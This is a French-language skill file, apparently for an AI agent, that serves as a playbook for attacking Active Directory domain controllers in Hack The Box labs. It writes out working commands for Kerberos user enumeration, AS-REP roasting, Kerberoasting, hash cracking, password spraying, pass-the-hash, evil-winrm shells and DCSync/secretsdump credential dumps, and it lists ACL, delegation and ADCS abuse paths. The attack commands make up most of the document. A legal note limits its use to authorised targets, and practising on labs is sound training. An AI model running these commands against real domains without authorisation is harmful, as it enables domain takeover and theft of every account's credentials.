---
name: htb-active-directory
description: >
  Attaque d'un domaine Active Directory sur une box/lab HTB autorisé. À déclencher
  quand on détecte un Domain Controller (ports 88 Kerberos, 389/636 LDAP, 445 SMB,
  5985 WinRM) ou un domaine .htb. Couvre : énumération (BloodHound, netexec,
  ldapdomaindump), AS-REP roasting et Kerberoasting (impacket), password spraying,
  abus d'ACL et de délégation, Pass-the-Hash, extraction de secrets (secretsdump),
  et accès via evil-winrm. Produit un chemin d'escalade vers Domain Admin.
metadata:
  type: reference
  category: active-directory
  legal: "Cibles autorisées uniquement (HTB, labs, CTF, systèmes vous appartenant)."
---

# HTB — Active Directory

## Quand utiliser cette skill
Un contrôleur de domaine est présent (Kerberos/LDAP/SMB) ou un domaine `.htb` est
connu. Objectif : partir d'un accès faible (souvent des creds bas privilège ou
même rien) et remonter jusqu'à Domain Admin.

## Pré-requis
Définir les variables et synchroniser l'horloge (Kerberos y est sensible) :
```bash
IP=10.10.10.10; DC=dc01.machine.htb; DOMAIN=machine.htb
sudo ntpdate "$IP" 2>/dev/null || sudo rdate -n "$IP" 2>/dev/null
echo "$IP $DC ${DC%%.*} $DOMAIN" | sudo tee -a /etc/hosts
```

## 1) Énumération
```bash
# Utilisateurs sans creds : brute des noms via Kerberos (pas de lockout)
kerbrute userenum -d "$DOMAIN" --dc "$IP" /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Avec des creds : cartographie complète
netexec ldap "$IP" -u user -p 'pass' --users --groups
ldapdomaindump -u "$DOMAIN\\user" -p 'pass' "$IP" -o ldapdump/

# BloodHound (collector Python)
bloodhound-python -u user -p 'pass' -d "$DOMAIN" -ns "$IP" -c All --zip
#  -> importer le .zip dans BloodHound GUI, chercher les chemins vers DA
```

## 2) Attaques Kerberos (sans creds ou avec)
```bash
# AS-REP roasting : comptes sans pré-auth (à partir d'une liste d'users)
impacket-GetNPUsers "$DOMAIN"/ -usersfile users.txt -no-pass -dc-ip "$IP" -format hashcat

# Kerberoasting : comptes de service (nécessite des creds valides)
impacket-GetUserSPNs "$DOMAIN"/user:'pass' -dc-ip "$IP" -request -outputfile kerb.hash

# Craquer (voir htb-password-attacks)
hashcat -m 18200 asrep.hash rockyou.txt   # AS-REP
hashcat -m 13100 kerb.hash rockyou.txt    # TGS/Kerberoast
```

## 3) Password spraying (prudence lockout)
```bash
netexec smb "$IP" -u users.txt -p 'Season2024!' --continue-on-success
```

## 4) Mouvement latéral & accès
```bash
# Vérifier où des creds/hash fonctionnent
netexec smb "$IP" -u user -p 'pass'                 # 'Pwn3d!' = admin local
netexec winrm "$IP" -u user -p 'pass'

# Pass-the-Hash
netexec smb "$IP" -u Administrator -H <NTLM_hash>

# Shell interactif
evil-winrm -i "$IP" -u user -p 'pass'
evil-winrm -i "$IP" -u Administrator -H <NTLM_hash>
```

## 5) Dump de secrets (une fois admin)
```bash
impacket-secretsdump "$DOMAIN"/user:'pass'@"$IP"
netexec smb "$IP" -u Administrator -H <hash> --ntds     # DCSync des hashes du domaine
```

## Réflexes / chemins classiques
- **AS-REP / Kerberoast** → hash crackable → nouveaux creds.
- **BloodHound montre `GenericAll`/`WriteDACL`/`ForceChangePassword`** → abuser l'ACL (reset password, ajouter au groupe).
- **`GetChangesAll`** → DCSync → hash de `krbtgt`/Administrator.
- **Délégation non contrainte / contrainte** → impersonation.
- **ADCS mal configuré** → `certipy find` puis ESC1-ESC8.
- Toujours rejouer les creds trouvés sur SMB/WinRM/MSSQL/LDAP (réutilisation).

## Astuces
- Erreur `KRB_AP_ERR_SKEW` = horloge désynchronisée → resync.
- Utiliser le FQDN (pas l'IP) pour les opérations Kerberos.
- Garder une trace de chaque credential dans un fichier `creds.txt` structuré.
